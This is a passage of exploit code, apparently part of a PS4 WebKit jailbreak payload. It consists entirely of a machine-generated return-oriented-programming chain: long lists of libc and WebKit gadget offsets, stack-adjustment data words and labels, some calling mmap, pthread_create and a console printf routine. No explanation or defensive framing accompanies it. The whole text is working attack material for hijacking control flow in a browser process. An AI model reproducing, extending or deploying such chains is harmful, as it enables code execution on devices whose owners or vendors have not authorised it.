libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+792472, //pop rcx
mmap_addr,
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+158944, //L2348
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L2348:
db([0, 0]); // 0x0
//L2331:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+792472, //pop rcx
pthread_create_addr,
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+160272, //L2349
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L2349:
db([0, 0]); // 0x0
//__putchar:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+160344, //L2350
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L2350:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+160480, //L2354
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+160432, //L2355
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2355:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2352:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2353:
db([0, 0]); // 0x0
set_gadget(webkit_base+432898,); //pop r8
//L2354:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+160576, //L2357
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+160560, //L2356
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2356:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2357:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+160712, //L2360
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+160696, //L2359
webkit_base+7438103, //mov [rsi], rax
libc_base+206806, //pop rdi
//L2358:
ropchain+136, //_ps4_printf_fd
libc_base+792472 //pop rcx
]);
//L2359:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2360:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+160864, //L2361
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+160896, //L2364
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+160880, //L2362
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+160848, //L2363
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2363:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2361:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2362:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2364:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+160968, //L2365
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+160984, //L2366
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2365:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2366:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+161104, //L2368
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+161120, //L2369
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+161088, //L2367
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2367:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2368:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2369:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+14959219, //cmp rax, rcx ; sete al
webkit_base+8824269, //setle al
libc_base+269973, //movzx eax, al
libc_base+793877, //pop rsi
ropchain+161288, //L2370
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+161304, //L2372
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+161272, //L2371
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2371:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2370:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2372:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+161408, //L2376
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+161456, //L2377
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+161424, //L2374
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2376:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2374:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2375:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2377:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+269973, //movzx eax, al
webkit_base+414627, //shl rax, 3
libc_base+793877, //pop rsi
ropchain+161568, //L2378+8
libc_base+547636, //add rax, rsi
libc_base+186490, //mov rax, [rax]
libc_base+793877, //pop rsi
ropchain+161560, //L2378
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+811575 //pop rsp
]);
//L2378:
db([0, 0]); // 0x0
set_gadgets([
ropchain+161584, //L2378+24
ropchain+162408, //L2373
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+161624, //L2381
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2381:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2379:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2380:
db([1, 0]); // 0x1
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+161752, //L2383
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+161736, //L2382
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2382:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2383:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+161848, //L2385
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L2384:
db([16, 0]); // 0x10
set_gadget(libc_base+788575,); //pop rax
//L2385:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+161992, //L2388
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+161976, //L2387
webkit_base+7438103, //mov [rsi], rax
libc_base+206806, //pop rdi
//L2386:
ropchain+136, //_ps4_printf_fd
libc_base+792472 //pop rcx
]);
//L2387:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2388:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+162144, //L2389
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+162176, //L2392
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+162160, //L2390
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+162128, //L2391
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2391:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2389:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2390:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2392:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+162272, //L2394
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+162256, //L2393
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2393:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2394:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L2396:
ropchain+162376, //L2395
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+164792, //L2397
//L2395:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
//L2373:
libc_base+793877, //pop rsi
ropchain+162448, //L2398
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2398:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2399:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+162552, //L2401
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+162568, //L2402
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2401:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2402:
db([0, 0]); // 0x0
set_gadgets([
libc_base+270096, //mov al, [rdi]
libc_base+793877, //pop rsi
ropchain+162728, //L2407
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+162696, //L2404
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+162680, //L2405
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2405:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2404:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2406:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L2407:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+162784, //L2408
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L2408:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+162888, //L2410
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+162920, //L2412
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+162904, //L2411
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2410:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2411:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2412:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+163080, //L2416
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+163048, //L2413
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+163032, //L2414
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2414:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2413:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2415:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L2416:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+163136, //L2417
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L2417:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+163240, //L2419
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+163272, //L2421
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+163256, //L2420
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2419:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2420:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2421:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+163344, //L2422
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+163360, //L2423
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2422:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2423:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+163520, //L2427
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+163488, //L2424
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+163472, //L2425
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2425:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2424:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2426:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L2427:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+163576, //L2428
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L2428:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+163680, //L2430
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+163712, //L2432
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+163696, //L2431
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2430:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2431:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2432:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+163808, //L2434
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+163792, //L2433
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2433:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2434:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+163944, //L2437
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+163928, //L2436
webkit_base+7438103, //mov [rsi], rax
libc_base+206806, //pop rdi
//L2435:
ropchain+128, //_ps4_printf_buffer
libc_base+792472 //pop rcx
]);
//L2436:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2437:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+164088, //L2440
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+164056, //L2438
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+164072, //L2439
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2438:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2439:
db([0, 0]); // 0x0
